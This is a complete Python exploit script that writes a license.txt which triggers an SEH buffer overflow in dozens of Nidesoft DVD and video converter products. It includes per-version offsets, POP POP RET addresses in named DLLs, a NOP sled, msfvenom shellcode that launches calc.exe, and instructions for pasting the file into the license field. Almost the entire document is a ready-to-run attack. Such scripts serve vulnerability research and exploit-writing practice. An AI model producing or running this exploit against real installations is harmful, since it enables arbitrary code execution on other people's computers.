#!/usr/bin/python

# Exploit Title: Nidesoft Multiple Products - SEH Local Buffer Overflow
# Date: 6/6/2017
# Exploit Author: @abatchy17 - www.abatchy.com
# Vendor Homepage: http://www.nidesoft.com
# Software Link: http://www.nidesoft.com/download.html
# Version: Multiple listed below
# Tested on: WinXP SP3, Win7 SP1 Professional

# How to exploit: On license window, paste contents of license.txt into the License field.
# Creds to malwrforensics for discovering original bug in 40917

#
# Sensitive llama feelings
#

import sys

products= [
        "Nidesoft DVD Ripper 5.3.48",
        "Nidesoft DVD Audio Ripper 5.3.48",
        "Nidesoft DVD to MP4 Converter 5.3.48",
        "Nidesoft DVD to Zune Converter 5.3.48",
        "Nidesoft DVD to iPod Converter 5.3.48",
        "Nidesoft DVD to PSP Converter 5.3.48",
        "Nidesoft DVD to 3GP Converter 5.3.48",
        "Nidesoft DVD to AVI Converter 5.3.48",
        "Nidesoft DVD to AppleTV Converter 5.3.48",
        "Nidesoft DVD to iPhone Converter 5.3.48",
        "Nidesoft DVD to Divx Converter 5.3.48",
        "Nidesoft DVD to WMV Converter 5.3.48",
        "Nidesoft DVD to google Phone Converter 5.3.48",
        "Nidesoft DVD to BlackBerry Converter 5.3.48",
        "Nidesoft DVD to Sony XPeria Converter 5.3.48",
        "Nidesoft DVD to Nokia Converter 5.3.48",
        "Nidesoft DVD to Sansa Converter 5.3.48",
        "Nidesoft DVD to Xbox Converter 5.3.48",
        "Nidesoft DVD to PS3 Converter 5.3.48",
        "Nidesoft DVD to Creative Zen Converter 5.3.48",
        "Nidesoft DVD to Palm Converter 5.3.48",
        "Nidesoft DVD to Samsung Converter 5.3.48",
        "Nidesoft DVD to MPEG Converter 5.3.48",
        "Nidesoft DVD to LG Converter 5.3.48",
        "Nidesoft DVD to MP3 Converter 5.3.48",
        "Nidesoft DVD to Mobile Converter 5.3.48",
        "Nidesoft DVD Audio Extractor 5.3.48",
        "Nidesoft DVD to iRiver Converter 5.3.48",
        "Nidesoft DVD Copy 5.3.48",
        "Nidesoft DVD to Motorola Converter 5.3.48",
        "Nidesoft DVD to HTC Converter 5.3.48",
        "Nidesoft DVD Decrypter 5.3.48",
        
        "Nidesoft iPod Video Converter 2.3.48",
        "Nidesoft Zune Video Converter 2.3.48",
        "Nidesoft iPhone Video Converter 2.3.48",
        "Nidesoft MP4 Video Converter 2.3.48",
        "Nidesoft PSP Video Converter 2.3.48",
        "Nidesoft Video Converter 2.3.48",
        "Nidesoft 3GP Video converter 2.3.48",
        "Nidesoft AVI converter 2.3.48",
        "Nidesoft YouTube Video converter 2.3.48",
        "Nidesoft FLV converter 2.3.48",
        "Nidesoft MP3 converter 2.3.48",
        "Nidesoft Google Phone Video converter 2.3.48",
        "Nidesoft Audio converter 2.3.48",
        "Nidesoft BlackBerry Video Converter 2.3.48",
        "Nidesoft Sony XPeria Video Converter 2.3.48",
        "Nidesoft Nokia Video Converter 2.3.48",
        "Nidesoft Sansa Video Converter 2.3.48",
        "Nidesoft FLV to AVI Converter",
        "Nidesoft MKV Converter 2.3.32",
        "Nidesoft Video to Flash Converter 2.3.32",
        "Nidesoft Palm Video Converter 2.3.32",
        "Nidesoft RM Converter 2.3.32",
        "Nidesoft iTunes Converter 2.3.32",
        "Nidesoft Total Video Converter 2.3.32",
        "Nidesoft HD Video Converter 2.3.32",
        "Nidesoft Samsung Video Converter 2.3.32",
        "Nidesoft WMV Video Converter 2.3.32",
        "Nidesoft VOB Converter 2.3.32",
        "Nidesoft Video Converter for Mac 2.3.32",
        "Nidesoft Walkman Video Converter 2.3.32",
        "Nidesoft LG Video Converter 2.3.32",
        "Nidesoft Motorola Video Converter 2.3.32",
        "Nidesoft HTC Video Converter 2.3.32",
        "Nidesoft Video Converter 2.6.18",
        "Nidesoft BlackBerry Video Converter 2.6.18",
        
        "Nidesoft DVD Ripper 5.6.28",
        "Nidesoft DVD to iPod Converter 5.6.28"
        "Nidesoft DVD to iPhone Converter 5.6.28"
        ]
        
data = [ 
	# [ Product type, Offset, POP POP RET, DLL name]
	[ "DVD v2.3.48", 6208, "\x14\x58\x01\x10", "Mpg2DecDll.dll"],
    [ "Video v2.3.48 or 2.3.32x", 5996 , "\x50\xe6\xaa\x66", "AVCODEC.dll"],
    [ "DVD v5.6.28", 6208, "\x50\xe6\xaa\x66", "AVCODEC.dll"]
]

if len(sys.argv) is not 2:
	print "Usage: exploit.py productnumber\n"
	index = 0
	for index in range(0, len(products)):
		print "   {0}) {1}".format(index, products[index])
	exit()

exploit = open("license.txt", "w")

productnumber = int(sys.argv[1])
print "\nProduct selected: {0}".format(products[productnumber])
index = -1

if 0 <= productnumber <= 31:
    index = 0
elif 32 <= productnumber <= 65:
    index = 1
elif 66 <= productnumber:
    index = 2

offset = data[index][1]
nSEH = "\xeb\x10\xaa\xaa"
SEH = data[index][2]
nopsled = "\x90" * 0x20

# msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00\x0a\x0d"
# Payload size: 220 bytes
sc =  ""
sc += "\xda\xd0\xd9\x74\x24\xf4\xb8\xf4\xfc\xc9\x15\x5b\x33"
sc += "\xc9\xb1\x31\x31\x43\x18\x83\xc3\x04\x03\x43\xe0\x1e"
sc += "\x3c\xe9\xe0\x5d\xbf\x12\xf0\x01\x49\xf7\xc1\x01\x2d"
sc += "\x73\x71\xb2\x25\xd1\x7d\x39\x6b\xc2\xf6\x4f\xa4\xe5"
sc += "\xbf\xfa\x92\xc8\x40\x56\xe6\x4b\xc2\xa5\x3b\xac\xfb"
sc += "\x65\x4e\xad\x3c\x9b\xa3\xff\x95\xd7\x16\x10\x92\xa2"
sc += "\xaa\x9b\xe8\x23\xab\x78\xb8\x42\x9a\x2e\xb3\x1c\x3c"
sc += "\xd0\x10\x15\x75\xca\x75\x10\xcf\x61\x4d\xee\xce\xa3"
sc += "\x9c\x0f\x7c\x8a\x11\xe2\x7c\xca\x95\x1d\x0b\x22\xe6"
sc += "\xa0\x0c\xf1\x95\x7e\x98\xe2\x3d\xf4\x3a\xcf\xbc\xd9"
sc += "\xdd\x84\xb2\x96\xaa\xc3\xd6\x29\x7e\x78\xe2\xa2\x81"
sc += "\xaf\x63\xf0\xa5\x6b\x28\xa2\xc4\x2a\x94\x05\xf8\x2d"
sc += "\x77\xf9\x5c\x25\x95\xee\xec\x64\xf3\xf1\x63\x13\xb1"
sc += "\xf2\x7b\x1c\xe5\x9a\x4a\x97\x6a\xdc\x52\x72\xcf\x12"
sc += "\x19\xdf\x79\xbb\xc4\xb5\x38\xa6\xf6\x63\x7e\xdf\x74"
sc += "\x86\xfe\x24\x64\xe3\xfb\x61\x22\x1f\x71\xf9\xc7\x1f"
sc += "\x26\xfa\xcd\x43\xa9\x68\x8d\xad\x4c\x09\x34\xb2"

junk = "D" * (784-16-220)

# Construct buffer
buffer = "A"*offset + nSEH + SEH + nopsled + sc + junk

exploit.write(buffer)
exploit.close()

print "Paste contents of license.txt into the license field.\n"
